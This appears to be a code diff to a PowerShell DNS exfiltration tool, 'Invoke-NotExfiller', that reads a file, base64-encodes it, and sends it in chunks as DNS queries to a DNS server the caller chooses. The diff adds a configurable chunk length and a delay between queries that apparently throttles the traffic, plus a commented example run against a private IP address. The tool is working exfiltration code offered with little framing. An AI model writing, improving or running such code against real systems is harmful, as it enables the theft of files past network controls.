@@ -3,23 +3,25 @@ function Invoke-NotExfiller {
     Param (
         [Parameter(Mandatory=$true)][string]$DNSServer,
         [Parameter(Mandatory=$true)][string]$File,
-        [Parameter(Mandatory=$false)][int]$RequestLength
+        [Parameter(Mandatory=$false)][int]$RequestLength,
+        [Parameter(Mandatory=$false)][int]$Delay
     )
 
     # Set default optional values if not set on command line
     if (!$RequestLength) { $RequestLength = 30 }
+    if (!$Delay) { $Delay = 0 }
 
     $targetDomain = ".test.local"
 
     # Check the given file path is valid
-    If (-Not (Test-Path -Path $File)) 
+    If (!(Test-Path $File)) 
     {
         Write-Output "[-] Error accessing file: '$File'!"
         Exit(-1)
     }
 
     # Get bytes from the target file and convert to Base64
-    $fileContentBytes = [System.IO.File]::ReadAllBytes($File)
+    $fileContentBytes = [System.IO.File]::ReadAllBytes((Convert-Path $File))
     $fileContentB64 = [Convert]::ToBase64String($fileContentBytes)
 
     # Replace equals with dash to make it URL safe
@@ -39,9 +41,9 @@ function Invoke-NotExfiller {
     $counter = 0
 
     # Loop over Base64 data sending the specific number of characters per request
-    for ($i=0; $i -lt $fileContentB64.Length; $i += 30) {
+    for ($i=0; $i -lt $fileContentB64.Length; $i += $RequestLength) {
         try {
-            $requestString = $fileContentB64.substring($i, 30) + $targetDomain
+            $requestString = $fileContentB64.substring($i, $RequestLength) + $targetDomain
             Resolve-DnsName -Name ($requestString) -Server $DNSServer -DnsOnly -Type A -NoHostsFile
             $counter++
         }
@@ -50,6 +52,8 @@ function Invoke-NotExfiller {
             Resolve-DnsName -Name ($requestString) -Server $DNSServer -DnsOnly -Type A -NoHostsFile
             $counter++
         }
+
+        Start-Sleep -Milliseconds $Delay
     }
 
     # Send end of file identifier
@@ -64,4 +68,8 @@ function Invoke-NotExfiller {
     ####
     # $fileContentOriginal = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($fileContentB64))
     # Write-Output "Original: $fileContentOriginal"
+
+
 }
+
+#Invoke-NotExfiller -DNSServer 192.168.51.108 -File test.docx
